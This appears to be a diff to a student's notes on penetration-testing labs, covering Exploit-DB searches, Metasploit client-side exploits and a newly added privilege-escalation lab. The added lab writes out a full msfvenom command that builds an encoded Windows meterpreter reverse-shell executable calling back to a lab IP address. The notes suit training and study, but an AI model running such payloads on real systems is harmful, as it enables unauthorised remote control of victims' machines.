@@ -6,4 +6,9 @@
     Lab 2: search exploits in exploit db.
     Lab 4: exploit client-side vulnerabilities and establish a VNC session.
             - Using msfconsole create a payload and share it with local host. open multi/handler to acess the session. open shared file in windows machine.
+    Lab 5: exploit using privilage escalation using session
+            steps:
+                    1. msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.0.2.42 -f exe > Desktop/Exploit.exe
+                    2. vim /etc/apache2/apache2.conf
+                        
 
